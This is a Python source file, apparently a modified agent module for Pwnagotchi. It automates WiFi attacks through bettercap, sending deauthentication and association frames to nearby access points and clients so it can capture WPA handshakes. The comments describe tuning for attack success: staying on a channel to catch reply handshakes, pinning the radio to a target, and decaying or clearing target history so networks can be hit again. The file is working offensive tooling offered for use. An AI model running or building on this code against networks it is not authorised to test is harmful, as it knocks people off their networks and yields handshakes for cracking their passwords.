import time
import json
import os
import re
import logging
import asyncio
import _thread
import threading
import glob

import pwnagotchi
import pwnagotchi.utils as utils
import pwnagotchi.plugins as plugins
from pwnagotchi.ui.web.server import Server
from pwnagotchi.automata import Automata
from pwnagotchi.log import LastSession
import pwnagotchi.bettercap as bettercap
from pwnagotchi.bettercap import Client
from pwnagotchi.mesh.utils import AsyncAdvertiser
from pwnagotchi.ai.train import AsyncTrainer

RECOVERY_DATA_FILE = '/root/.pwnagotchi-recovery'

# --- INTERACTION HISTORY DECAY ---
# how often the background worker checks for decay opportunities (seconds)
HISTORY_DECAY_CHECK_INTERVAL = 60
# a MAC's interaction count drops by 1 once it's been absent (not seen) for
# this long, and repeats every time another full interval of absence passes
HISTORY_DECAY_INTERVAL = 30 * 60  # 30 minutes
# ----------------------------------

# --- FORGET-HANDSHAKE (live testing aid) ---
# drop one MAC (or any substring of one, same matching rule _has_handshake
# already uses) per line into this file and it's picked up on the next
# decay-worker tick: removes any matching _handshakes/_history entries so
# the agent treats it as never having been touched, without needing a
# process restart (which would also throw away every other MAC's history/
# handshake state and the current uptime/session, not just the one target).
FORGET_HANDSHAKE_FILE = '/root/.pwnagotchi-forget'
# --------------------------------------------


class Agent(Client, Automata, AsyncAdvertiser, AsyncTrainer):
    def __init__(self, view, config, keypair):
        Client.__init__(self, config['bettercap']['hostname'],
                        config['bettercap']['scheme'],
                        config['bettercap']['port'],
                        config['bettercap']['username'],
                        config['bettercap']['password'])
        Automata.__init__(self, config, view)
        AsyncAdvertiser.__init__(self, config, view, keypair)
        AsyncTrainer.__init__(self, config)

        self._started_at = time.time()
        self._filter = None if not config['main']['filter'] else re.compile(config['main']['filter'])
        self._current_channel = 0
        self._tot_aps = 0
        self._aps_on_channel = 0
        self._supported_channels = utils.iface_channels(config['main']['iface'])
        self._view = view
        self._view.set_agent(self)
        self._web_ui = Server(self, config['ui'])

        # persistent wait flag that survives epoch rollovers -- now holds a
        # number of seconds (0 = nothing pending) rather than a bool, so we
        # can carry the right wait duration through to set_channel()
        self._pending_wait = 0

        self._access_points = []
        self._last_pwnd = None
        self._history = {}
        # --- INTERACTION HISTORY DECAY ---
        self._last_seen = {}     # mac -> last time we actually saw it on the radio
        self._last_decay = {}    # mac -> last time its history count was decremented
        self._history_lock = threading.Lock()
        # ---------------------------------
        self._handshakes = {}
        self._handshakes_lock = threading.Lock()
        self.last_session = LastSession(self._config)
        self.mode = 'auto'
        # true if any whitelisted AP was visible as of the last get_access_points() call
        self._whitelist_ap_visible = False

        if not os.path.exists(config['bettercap']['handshakes']):
            os.makedirs(config['bettercap']['handshakes'])

        logging.info("%s@%s (v%s)", pwnagotchi.name(), self.fingerprint(), pwnagotchi.__version__)
        for _, plugin in plugins.loaded.items():
            logging.debug("plugin '%s' v%s", plugin.__class__.__name__, plugin.__version__)

    def config(self):
        return self._config

    def view(self):
        return self._view

    def supported_channels(self):
        # this is first populated in __init__, which runs before
        # start_monitor_mode() has necessarily brought mon_iface up yet --
        # if the interface didn't exist at that exact moment, iface_channels()
        # silently returns [] and (without this) that empty result would be
        # cached forever for the rest of the process's life, permanently
        # starving the AI's action space of any channel parameters and
        # making its saved brain.nn fail to load on every future boot until
        # the next lucky race. Retry here instead of trusting the one-shot
        # value from construction time.
        if not self._supported_channels:
            self._supported_channels = utils.iface_channels(self._config['main']['iface'])
        return self._supported_channels

    def setup_events(self):
        logging.info("connecting to %s ...", self.url)

        for tag in self._config['bettercap']['silence']:
            try:
                self.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception:
                pass

    def _apply_hop_period(self):
        # Confirmed on-device over an extended period of testing: frequent
        # channel hopping is the single biggest driver of nexmon/mon0
        # instability on this chip (BCM43430) -- a full evening of the AI
        # hopping across shifting sets of 5-10 channels every 1-3 minutes
        # produced a crash-loop roughly every 20-40 minutes (bettercap
        # dying, reload_brcm, full reboots), which stopped completely once
        # locked to a single channel. Previously this varied by whether a
        # bluetooth PAN tether was connected (the wifi chip shares its
        # radio/firmware with bluetooth on this combo chip) -- simplified
        # to always use the same conservative period regardless, rather
        # than ever risking the faster one.
        hop_period = self._config['personality'].get('wifi_hop_period_ms', 1000)
        self.run('set wifi.hop.period %d' % hop_period)

    def _reset_wifi_settings(self):
        mon_iface = self._config['main']['iface']
        self.run('set wifi.interface %s' % mon_iface)
        self.run('set wifi.ap.ttl %d' % self._config['personality']['ap_ttl'])
        self.run('set wifi.sta.ttl %d' % self._config['personality']['sta_ttl'])
        self.run('set wifi.rssi.min %d' % self._config['personality']['min_rssi'])
        self.run('set wifi.handshakes.file %s' % self._config['bettercap']['handshakes'])
        self.run('set wifi.handshakes.aggregate false')

        # see _apply_hop_period() -- always issued, even when it equals
        # bettercap's own default: skipping the call when it matched
        # bettercap's default (the old behavior here) meant a *previous*
        # boot's non-default value could never be reverted, since bettercap
        # has no way to know the config changed back without being told
        # again -- confirmed live on-device: set to 750 one boot, changed
        # back to 250 in config, bettercap stayed at 750 across the next
        # restart because this line never re-ran.
        self._apply_hop_period()

    # consecutive failed monitor-interface start attempts before giving up
    # and rebooting -- a single failed attempt used to raise straight out of
    # this method uncaught, crashing the whole process (silently, since the
    # systemd unit discards stderr) and losing the one-shot auto-mode flag
    MAX_MON_START_ATTEMPTS = 5

    def start_monitor_mode(self):
        mon_iface = self._config['main']['iface']
        mon_start_cmd = self._config['main']['mon_start_cmd']
        restart = not self._config['main']['no_restart']
        has_mon = False
        failed_attempts = 0

        while has_mon is False:
            s = self.session()
            for iface in s['interfaces']:
                if iface['name'] == mon_iface:
                    logging.info("found monitor interface: %s", iface['name'])
                    has_mon = True
                    break

            if has_mon is False:
                if mon_start_cmd is not None and mon_start_cmd != '':
                    logging.info("starting monitor interface ...")
                    try:
                        self.run('!%s' % mon_start_cmd)
                        failed_attempts = 0
                    except Exception as e:
                        failed_attempts += 1
                        logging.warning("failed to start monitor interface (attempt %d/%d): %s",
                                         failed_attempts, self.MAX_MON_START_ATTEMPTS, e)
                        if failed_attempts >= self.MAX_MON_START_ATTEMPTS:
                            logging.critical(
                                "monitor interface failed to start %d times in a row -- "
                                "rebooting to clear driver state", failed_attempts)
                            pwnagotchi.reboot(mode='AUTO')
                            return
                        time.sleep(3)
                else:
                    logging.info("waiting for monitor interface %s ...", mon_iface)
                    time.sleep(1)

        logging.info("supported channels: %s", self.supported_channels())
        logging.info("handshakes will be collected inside %s", self._config['bettercap']['handshakes'])

        self._reset_wifi_settings()

        wifi_running = self.is_module_running('wifi')
        if wifi_running and restart:
            logging.debug("restarting wifi module ...")
            self.restart_module('wifi.recon')
            self.run('wifi.clear')
        elif not wifi_running:
            logging.debug("starting wifi module ...")
            self.start_module('wifi.recon')

        self.start_advertising()

    # matches watchdog's own grace period for a bettercap-down check mid-run
    # (see watchdog.py's _is_bettercap_still_down_after_grace_period). 60s
    # was confirmed on-device to be too tight: after a rapid string of
    # restarts, bettercap-launcher can need 2-3 attempts to recreate mon0
    # (each ~30s apart, since it doesn't exist yet right after a restart),
    # legitimately taking 90-120s+ to actually come up -- causing this to
    # fire a full reboot for something that was already recovering on its
    # own, which then triggers another rapid restart, compounding the exact
    # problem it was trying to fix.
    BETTERCAP_WAIT_TIMEOUT = 180

    def _wait_bettercap(self):
        # this runs before the first epoch, so watchdog's on_epoch-based
        # bettercap-down detection never gets a chance to fire if bettercap
        # never comes up at all (e.g. the wifi chip's firmware crashed and
        # the SDIO card dropped off the bus -- confirmed on-device: bettercap
        # can't even start without its interface, and no shell-level retry
        # brings a vanished kernel device back, only a reboot does). Without
        # a bound this loop waits forever and the device just sits there.
        waited = 0
        while True:
            try:
                _s = self.session()
                return
            except Exception:
                logging.info("waiting for bettercap API to be available ...")
                time.sleep(1)
                waited += 1
                if waited >= self.BETTERCAP_WAIT_TIMEOUT:
                    logging.critical(
                        "bettercap API did not come up after %ds -- rebooting to recover", waited)
                    pwnagotchi.reboot(mode='AUTO')
                    return

    def start(self):
        self.start_ai()
        self._wait_bettercap()
        self.setup_events()
        self.set_starting()
        self.start_monitor_mode()
        self.start_event_polling()
        self.start_session_fetcher()
        self.start_history_decay()   # NEW
        self.next_epoch()
        self.set_ready()

    def flush_pending_wait(self):
        # Closes out the scan > attack > wait > new epoch cycle: takes any
        # reply-window wait still owed on the channel we just attacked,
        # *before* the epoch ends -- so the wait time (and the chance of
        # catching a delayed handshake) is attributed to the epoch that
        # earned it, not bled into the next epoch's recon(). Call this
        # right after the per-channel attack loop, right before next_epoch().
        if self._current_channel != 0 and self._pending_wait > 0:
            logging.info("holding on channel %d for %ds before ending epoch ...",
                         self._current_channel, self._pending_wait)
            self.wait_for(self._pending_wait)
        self._pending_wait = 0

    def recon(self):
        # Normally flush_pending_wait() (called right before next_epoch())
        # already cleared this out, so this is just a defensive fallback in
        # case recon() ever gets called without that happening first.
        if self._current_channel != 0 and self._pending_wait > 0:
            logging.info("holding on channel %d for %ds before broadening recon ...",
                         self._current_channel, self._pending_wait)
            self.wait_for(self._pending_wait)
        self._pending_wait = 0
        self._epoch.did_deauth = False

        recon_time = self._config['personality']['recon_time']
        max_inactive = self._config['personality']['max_inactive_scale']
        recon_mul = self._config['personality']['recon_inactive_multiplier']
        channels = self._config['personality']['channels']

        if self._epoch.inactive_for >= max_inactive:
            recon_time *= recon_mul

        self._view.set('channel', '*')

        # Release the AP-level channel stick set by associate()/deauth()
        # (wifi.recon <bssid>, bettercap's own stickChan) before opening
        # recon back up -- stickChan is checked unconditionally ahead of
        # the hop frequency list, so a lingering stick would silently
        # override whatever channel list we ask for below.
        self.run('wifi.recon clear')

        if not channels:
            self._current_channel = 0
            logging.debug("RECON %ds", recon_time)
        else:
            logging.debug("RECON %ds ON CHANNELS %s", recon_time, ','.join(map(str, channels)))
            try:
                self.run('wifi.recon.channel %s' % ','.join(map(str, channels)))
            except Exception as e:
                logging.exception("Error while setting wifi.recon.channels (%s)", e)

        self.wait_for(recon_time, sleeping=False)

    def _filter_included(self, ap):
        return self._filter is None or \
               self._filter.match(ap['hostname']) is not None or \
               self._filter.match(ap['mac']) is not None

    def set_access_points(self, aps):
        self._access_points = aps

        # --- INTERACTION HISTORY DECAY: NEW ---
        # stamp every MAC we can currently see (APs and their clients) so the
        # decay worker knows it's still "present" and shouldn't touch its count
        now = time.time()
        with self._history_lock:
            for ap in aps:
                self._last_seen[ap['mac']] = now
                for sta in ap['clients']:
                    self._last_seen[sta['mac']] = now
        # ---------------------------------------

        plugins.on('wifi_update', self, aps)
        self._epoch.observe(aps, list(self._peers.values()))
        return self._access_points

    def get_access_points(self):
        whitelist = self._config['main']['whitelist']
        aps = []
        try:
            s = self.session()
            plugins.on("unfiltered_ap_list", self, s['wifi']['aps'])
            # checked against the unfiltered list, so this still catches whitelisted
            # APs even though they never make it into the aps list below
            self._whitelist_ap_visible = bool(whitelist) and any(
                ap['hostname'] in whitelist or ap['mac'].lower() in whitelist or ap['mac'][:8].lower() in whitelist
                for ap in s['wifi']['aps']
            )
            for ap in s['wifi']['aps']:
                if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
                    continue
                elif ap['hostname'] not in whitelist \
                        and ap['mac'].lower() not in whitelist \
                        and ap['mac'][:8].lower() not in whitelist:
                    if self._filter_included(ap):
                        aps.append(ap)
        except Exception as e:
            # session() has no retry/backoff of its own (unlike run()), so
            # this fires every single epoch bettercap is deliberately
            # stopped for during an update -- same EXPECTED_DOWNTIME flag
            # bettercap.py's own retry loops check, so this doesn't dump a
            # full traceback for something that isn't actually a problem
            if bettercap.EXPECTED_DOWNTIME:
                logging.debug("error while getting access points (expected -- update in progress): %s", e)
            else:
                logging.exception("Error while getting acces points (%s)", e)

        aps.sort(key=lambda ap: ap['channel'])
        return self.set_access_points(aps)

    def is_whitelisted_ap_visible(self):
        return self._whitelist_ap_visible

    def get_total_aps(self):
        return self._tot_aps

    def get_aps_on_channel(self):
        return self._aps_on_channel

    def get_current_channel(self):
        return self._current_channel

    def get_access_points_by_channel(self):
        aps = self.get_access_points()
        channels = self._config['personality']['channels']
        grouped = {}

        for ap in aps:
            ch = ap['channel']
            if channels and ch not in channels:
                continue

            if ch not in grouped:
                grouped[ch] = [ap]
            else:
                grouped[ch].append(ap)

        # Sort by total client count on the channel, not AP count. A channel
        # with lots of APs but no clients can only be hit with associate(),
        # which is a much less reliable way to get a handshake than deauth
        # -- so prioritize wherever the actual stations are. AP count is
        # kept as a tiebreaker for channels with equal (often zero) clients.
        return sorted(grouped.items(),
                      key=lambda kv: (sum(len(ap['clients']) for ap in kv[1]), len(kv[1])),
                      reverse=True)

    def _find_ap_sta_in(self, station_mac, ap_mac, session):
        for ap in session['wifi']['aps']:
            if ap['mac'] == ap_mac:
                for sta in ap['clients']:
                    if sta['mac'] == station_mac:
                        return (ap, sta)
                return (ap, {'mac': station_mac, 'vendor': ''})
        return None

    def _update_uptime(self, s):
        secs = pwnagotchi.uptime()
        self._view.set('uptime', utils.secs_to_hhmmss(secs))

    def _update_counters(self):
        self._tot_aps = len(self._access_points)
        tot_stas = sum(len(ap['clients']) for ap in self._access_points)
        if self._current_channel == 0:
            self._view.set('aps', '%d' % self._tot_aps)
            self._view.set('sta', '%d' % tot_stas)
        else:
            self._aps_on_channel = len([ap for ap in self._access_points if ap['channel'] == self._current_channel])
            stas_on_channel = sum(
                [len(ap['clients']) for ap in self._access_points if ap['channel'] == self._current_channel])
            self._view.set('aps', '%d (%d)' % (self._aps_on_channel, self._tot_aps))
            self._view.set('sta', '%d (%d)' % (stas_on_channel, tot_stas))

    def _get_historical_last_pwnd(self):
        try:
            handshake_dir = self._config['bettercap']['handshakes']
            if not os.path.exists(handshake_dir):
                return None

            files = glob.glob(os.path.join(handshake_dir, '*.pcap'))
            if not files:
                return None

            newest_file = max(files, key=os.path.getmtime)
            filename = os.path.basename(newest_file)

            name_part, _ = os.path.splitext(filename)

            if '_' in name_part:
                parts = name_part.split('_')
                if len(parts) > 1:
                    return '_'.join(parts[:-1])

            return name_part
        except Exception as e:
            import logging
            logging.debug(f"[UI System] Could not read last handshake from disk: {e}")
            return None

    def _format_shakes_text(self, session, tot):
        # On portrait, 'shakes' (label "PWND ") and 'mode' share row y=223 with
        # 'mode' starting at x=93 -- if the value grows too wide it draws right
        # into the mode text. Preserve the lifetime total in full always, and
        # cap the session count to whatever digits still fit, so the two never
        # overlap regardless of how large either number gets.
        total_str = str(tot)
        session_str = str(session)
        try:
            if self._view._width != 122:
                raise ValueError("not portrait")
            shakes = self._view._state._state['shakes']
            mode = self._view._state._state['mode']
            # matches LabeledValue.draw()'s own value x-offset formula exactly
            label_px = shakes.label_spacing + shakes.label_font.getlength(shakes.label)
            available_px = mode.xy[0] - shakes.xy[0] - label_px
            value_budget = max(0, available_px // 6)  # 6px per monospace char
        except Exception:
            value_budget = 0  # unknown/non-portrait layout -- don't truncate

        overhead = 3  # " (" + ")"
        session_budget = value_budget - overhead - len(total_str)
        if value_budget and 0 < session_budget < len(session_str):
            session_str = '9' * (session_budget - 1) + '+' if session_budget > 1 else '+'

        return '%s (%s)' % (session_str, total_str)

    def _update_handshakes(self, new_shakes=0):
        if new_shakes > 0:
            self._epoch.track(handshake=True, inc=new_shakes)
        tot = utils.total_unique_handshakes(self._config['bettercap']['handshakes'])
        txt = self._format_shakes_text(len(self._handshakes), tot)
        self._view.set('shakes', txt)
        try:
            shakes_x, shakes_y = self._view._state._state['shakes'].xy
            if self._view._width == 122:
            # Portrait mode -- static position on line below shakes
                self._view._state._state['last_pwnd_name'].xy = (3, 233)
            else:
                dynamic_offset = 32 + (len(txt) * 6)
                self._view._state._state['last_pwnd_name'].xy = (shakes_x + dynamic_offset, shakes_y)
        except Exception:
            pass

        if self._last_pwnd is None:
            self._last_pwnd = self._get_historical_last_pwnd()

        if self._last_pwnd is not None:
            self._view.set('last_pwnd_name', '[%s]' % self._last_pwnd)
        else:
            self._view.set('last_pwnd_name', '')

        if new_shakes > 0:
            self._view.on_handshakes(new_shakes)

    def _update_peers(self):
        self._view.set_closest_peer(self._closest_peer, len(self._peers))

    def _reboot(self):
        self.set_rebooting()
        self._save_recovery_data()
        pwnagotchi.reboot()

    def _save_recovery_data(self):
        logging.warning("writing recovery data to %s ...", RECOVERY_DATA_FILE)
        with open(RECOVERY_DATA_FILE, 'w') as fp:
            data = {
                'started_at': self._started_at,
                'epoch': self._epoch.epoch,
                'history': self._history,
                'handshakes': self._handshakes,
                'last_pwnd': self._last_pwnd
            }
            json.dump(data, fp)

    def _load_recovery_data(self, delete=True, no_exceptions=True):
        try:
            with open(RECOVERY_DATA_FILE, 'rt') as fp:
                data = json.load(fp)
                logging.info("found recovery data: %s", data)
                self._started_at = data['started_at']
                self._epoch.epoch = data['epoch']
                self._handshakes = data['handshakes']
                self._history = data['history']
                self._last_pwnd = data['last_pwnd']

                # --- INTERACTION HISTORY DECAY: NEW ---
                # seed fresh timestamps for the recovered counts so they don't
                # look like they've been silent since 1970 and instantly decay
                # on the very first tick after this reboot
                now = time.time()
                with self._history_lock:
                    for mac in self._history:
                        self._last_seen[mac] = now
                        self._last_decay[mac] = now
                # ---------------------------------------

                if delete:
                    logging.info("deleting %s", RECOVERY_DATA_FILE)
                    os.unlink(RECOVERY_DATA_FILE)
        except:
            if not no_exceptions:
                raise

    def start_session_fetcher(self):
        _thread.start_new_thread(self._fetch_stats, ())

    def _fetch_stats(self):
        while True:
            try:
                s = self.session()
                self._update_uptime(s)
                self._update_advertisement(s)
                self._update_peers()
                self._update_counters()
                self._update_handshakes(0)
            except Exception as e:
                logging.debug(f"[fetch_stats] bettercap unreachable, retrying in 1s: {e}")
            time.sleep(1)

    # --- INTERACTION HISTORY DECAY ---
    def start_history_decay(self):
        _thread.start_new_thread(self._history_decay_worker, ())

    def _history_decay_worker(self):
        while True:
            time.sleep(HISTORY_DECAY_CHECK_INTERVAL)
            try:
                self._decay_history()
            except Exception as e:
                logging.exception("error while decaying interaction history: %s" % e)
            try:
                self._check_forget_requests()
            except Exception as e:
                logging.exception("error while processing forget requests: %s" % e)

    def _decay_history(self):
        now = time.time()
        with self._history_lock:
            for mac in list(self._history.keys()):
                last_seen = self._last_seen.get(mac, 0)
                last_decay = self._last_decay.get(mac, 0)
                # the decay clock restarts from whichever happened more
                # recently -- being seen again always resets it, even if
                # it had already partially decayed before reappearing
                anchor = max(last_seen, last_decay)

                if now - anchor >= HISTORY_DECAY_INTERVAL:
                    old = self._history[mac]
                    new = old - 1

                    if new <= 0:
                        del self._history[mac]
                        self._last_decay.pop(mac, None)
                        self._last_seen.pop(mac, None)
                        logging.info("[history] %s fully decayed, eligible for interaction again", mac)
                    else:
                        self._history[mac] = new
                        self._last_decay[mac] = now
                        logging.info("[history] %s interaction count decayed %d -> %d", mac, old, new)
    # ---------------------------------------

    # --- FORGET-HANDSHAKE (live testing aid) ---
    def _check_forget_requests(self):
        if not os.path.exists(FORGET_HANDSHAKE_FILE):
            return

        try:
            with open(FORGET_HANDSHAKE_FILE, 'rt') as fp:
                targets = [line.strip().lower() for line in fp if line.strip()]
        finally:
            os.unlink(FORGET_HANDSHAKE_FILE)

        for target in targets:
            with self._handshakes_lock:
                forgotten_shakes = [key for key in self._handshakes if target in key.lower()]
                for key in forgotten_shakes:
                    del self._handshakes[key]

            with self._history_lock:
                forgotten_history = [mac for mac in self._history if target in mac.lower()]
                for mac in forgotten_history:
                    del self._history[mac]
                    self._last_seen.pop(mac, None)
                    self._last_decay.pop(mac, None)

            if forgotten_shakes or forgotten_history:
                logging.warning("[forget] %s -- cleared handshake(s) %s and history %s, eligible for interaction again",
                                 target, forgotten_shakes, forgotten_history)
            else:
                logging.warning("[forget] %s -- no matching handshake or history entry found", target)

        if targets:
            self._update_handshakes(0)
    # --------------------------------------------

    async def _on_event(self, msg):
        found_handshake = False
        jmsg = json.loads(msg)

        try:
            plugins.on('bcap_%s' % re.sub(r"[^a-z0-9_]+", "_",  jmsg['tag'].lower()), self, jmsg)
        except Exception as err:
            logging.error("Processing event: %s" % err)

        if jmsg['tag'] == 'wifi.client.handshake':
            filename = jmsg['data']['file']
            sta_mac = jmsg['data']['station']
            ap_mac = jmsg['data']['ap']
            key = "%s -> %s" % (sta_mac, ap_mac)

            with self._handshakes_lock:
                is_new = key not in self._handshakes
                if is_new:
                    self._handshakes[key] = jmsg

            if is_new:
                s = self.session()
                ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
                if ap_and_station is None:
                    logging.warning("!!! captured new handshake: %s !!!", key)
                    self._last_pwnd = ap_mac
                    plugins.on('handshake', self, filename, ap_mac, sta_mac)
                else:
                    (ap, sta) = ap_and_station
                    self._last_pwnd = ap['hostname'] if ap['hostname'] != '' and ap[
                        'hostname'] != '<hidden>' else ap_mac
                    logging.warning(
                        "!!! captured new handshake on channel %d, %d dBm: %s (%s) -> %s [%s (%s)] !!!",
                            ap['channel'],
                            ap['rssi'],
                            sta['mac'], sta['vendor'],
                            ap['hostname'], ap['mac'], ap['vendor'])
                    plugins.on('handshake', self, filename, ap, sta)
                found_handshake = True

            self._update_handshakes(1 if found_handshake else 0)

    def _event_poller(self, loop):
        self._load_recovery_data()
        self.run('events.clear')

        while True:
            logging.debug("polling events ...")
            try:
                loop.create_task(self.start_websocket(self._on_event))
                loop.run_forever()
            except Exception as ex:
                logging.debug("Error while polling via websocket (%s)", ex)

    def start_event_polling(self):
        _thread.start_new_thread(self._event_poller, (asyncio.get_event_loop(),))

    def is_module_running(self, module):
        s = self.session()
        for m in s['modules']:
            if m['name'] == module:
                return m['running']
        return False

    def start_module(self, module):
        self.run('%s on' % module)

    def restart_module(self, module):
        self.run('%s off; %s on' % (module, module))

    def _has_handshake(self, bssid):
        with self._handshakes_lock:
            for key in self._handshakes:
                if bssid.lower() in key.lower():
                    return True
        return False

    def _should_interact(self, who):
        # --- INTERACTION HISTORY DECAY: lock added so the background
        # decay worker can't race with this on the same dict ---
        with self._history_lock:
            if self._has_handshake(who):
                return False

            elif who not in self._history:
                self._history[who] = 1
                return True

            else:
                self._history[who] += 1

            return self._history[who] < self._config['personality']['max_interactions']

    def associate(self, ap, throttle=None):
        if self.is_stale():
            logging.debug("recon is stale, skipping assoc(%s)", ap['mac'])
            return

        # Upstream evilsocket/pwnagotchi added this parameter but never
        # actually passed a value at its one call site (bin/pwnagotchi's
        # epoch loop calls agent.associate(ap) with nothing else), so
        # throttle defaulted to 0 and this never actually throttled
        # anything there either -- confirmed against the original source.
        # None (rather than a hardcoded overwrite of whatever the caller
        # passed) means "use the configured default", while still letting
        # a caller that actually wants a specific value (0 included) have
        # it honored.
        if throttle is None:
            throttle = self._config['personality'].get('action_throttle', 0.8)

        if self._config['personality']['associate'] and self._should_interact(ap['mac']):
            self._view.on_assoc(ap)

            try:
                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients], %d dBm...",
                    ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], len(ap['clients']), ap['rssi'])
                # Field-confirmed with a live iw-based channel sampler:
                # narrowing the hop *list* (wifi.recon.channel) is not
                # enough -- bettercap's channel hopper drifted off within
                # a couple of seconds regardless. wifi.recon <bssid> sets
                # bettercap's own stickChan, which its hopper checks
                # unconditionally *before* consulting the hop list at all,
                # and which persists on its own (not reset until the next
                # wifi.recon call) through the whole attack + reply-window
                # hold, all the way until recon() explicitly releases it.
                self.run('wifi.recon %s' % ap['mac'])
                self.run('wifi.assoc %s' % ap['mac'])
                self._epoch.track(assoc=True)

                # Hold this channel for a bit before set_channel() is allowed
                # to hop away, so a reply has a chance to arrive. Don't
                # shorten a longer wait already queued up by a deauth.
                self._pending_wait = max(self._pending_wait,
                                          self._config['personality']['min_recon_time'])

            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('association', self, ap)
            if throttle > 0:
                time.sleep(throttle)
                # CLOCK FIX: Tell the epoch timer it slept so it doesn't penalize the channel time limit
                self._epoch.track(sleep=True, inc=throttle)

            self._view.on_normal()

    def deauth(self, ap, sta, throttle=None):
        if self.is_stale():
            logging.debug("recon is stale, skipping deauth(%s)", sta['mac'])
            return

        # see associate() -- same fix, same reasoning
        if throttle is None:
            throttle = self._config['personality'].get('action_throttle', 0.8)

        if self._config['personality']['deauth'] and self._should_interact(sta['mac']):
            self._view.on_deauth(sta)

            try:
                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d, %d dBm ...",
                    sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], ap['rssi'])
                # see associate() -- same stickChan pin, same reasoning
                self.run('wifi.recon %s' % ap['mac'])
                self.run('wifi.deauth %s' % sta['mac'])
                self._epoch.track(deauth=True)

                # Deauth gets the longer wait, and always wins over a
                # shorter assoc wait queued earlier on the same channel --
                # we want to stick around for the handshake.
                self._pending_wait = max(self._pending_wait,
                                          self._config['personality']['hop_recon_time'])

            except Exception as e:
                self._on_error(sta['mac'], e)

            plugins.on('deauthentication', self, ap, sta)

            if throttle > 0:
                time.sleep(throttle)
                # CLOCK FIX: Tell the epoch timer it slept so it doesn't penalize the channel time limit
                self._epoch.track(sleep=True, inc=throttle)

            self._view.on_normal()

    def set_channel(self, channel, verbose=True):
        if self.is_stale():
            logging.debug("recon is stale, skipping set_channel(%d)", channel)
            return

        if channel != self._current_channel:
            # If a deauth (or assoc) just happened on the channel we're
            # currently sitting on, give it a chance to get a reply before
            # we abandon it for the next router -- this is the actual fix
            # for "switches channel, misses the packet from the first one".
            if self._current_channel != 0 and self._pending_wait > 0:
                logging.info("holding on channel %d for %ds before hopping to %d ...",
                             self._current_channel, self._pending_wait, channel)
                self.wait_for(self._pending_wait)
                self._pending_wait = 0

            if verbose and self._epoch.any_activity:
                logging.info("CHANNEL %d", channel)
            try:
                self.run('wifi.recon.channel %d' % channel)
                self._current_channel = channel
                self._epoch.track(hop=True)

                plugins.on('channel_hop', self, channel)

            except Exception as e:
                logging.error("Error while setting channel (%s)", e)

        # Always reflect the real channel on screen once we're actually
        # parked on one -- not just on calls that caused a hop. Otherwise,
        # staying on the same channel across epochs (very common when
        # there's really just one network of interest) leaves the display
        # stuck on '*' from the last recon() call, even though the radio
        # is genuinely fixed on a single channel the whole time.
        if self._current_channel != 0:
            self._view.set('channel', '%d' % self._current_channel)
